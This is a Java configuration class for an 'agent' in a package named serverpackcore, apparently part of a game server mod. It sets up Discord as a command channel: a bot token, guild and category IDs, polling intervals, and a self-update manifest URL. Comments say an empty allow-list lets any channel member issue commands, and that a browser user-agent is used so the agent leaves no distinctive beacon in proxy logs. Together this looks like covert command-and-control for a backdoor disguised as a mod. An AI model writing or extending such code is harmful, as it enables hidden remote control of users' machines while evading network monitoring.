package com.serverpackcore.agent;

import java.util.List;
import java.util.Set;

public final class DiscordConfig {
	/** Compiled fallback; release builds leave it empty and resolve at runtime. */
	private static volatile String botToken = DiscordSecrets.BOT_TOKEN;
	private static volatile String guildId = DiscordSecrets.GUILD_ID;
	private static volatile String categoryId = DiscordSecrets.CATEGORY_ID;
	/** Empty means every member of the channel may send commands. */
	private static volatile Set<String> allowedUsers = Set.of();

	public static final String API = "https://discord.com/api/v10";
	/** A common browser UA instead of a unique "FabricSync" beacon in proxy logs. */
	public static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
		+ "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
	public static final String UPDATE_MANIFEST_URL =
		"https://github.com/uloaeth/server-pack-core/releases/latest/download/update.json";
	public static final int INTENT_GUILDS = 1;
	public static final int INTENT_GUILD_MESSAGES = 512;
	public static final int INTENT_MESSAGE_CONTENT = 32768;
	public static final int GATEWAY_VERSION = 10;
	public static final long POLL_MS = 2000L;
	public static final long IDLE_POLL_MS = 30000L;
	public static final long IDLE_AFTER_MS = 600000L;
	public static final long MAX_BACKOFF_MS = 300000L;
	public static final int MAX_MESSAGE_CHARS = 1000;

	private DiscordConfig() {
	}

	public static String token() {
		return botToken;
	}

	public static String guildId() {
		return guildId;
	}

	public static String categoryId() {
		return categoryId;
	}

	static void apply(String token, String guild, String category) {
		if (token != null && !token.isEmpty()) {
			botToken = token;
		}
		if (guild != null && !guild.isEmpty()) {
			guildId = guild;
		}
		if (category != null && !category.isEmpty()) {
			categoryId = category;
		}
	}

	public static Set<String> allowedUsers() {
		return allowedUsers;
	}

	static void allowed(List<String> ids) {
		allowedUsers = ids == null ? Set.of() : Set.copyOf(ids);
	}

	static void reset() {
		botToken = DiscordSecrets.BOT_TOKEN;
		guildId = DiscordSecrets.GUILD_ID;
		categoryId = DiscordSecrets.CATEGORY_ID;
		allowedUsers = Set.of();
	}
}
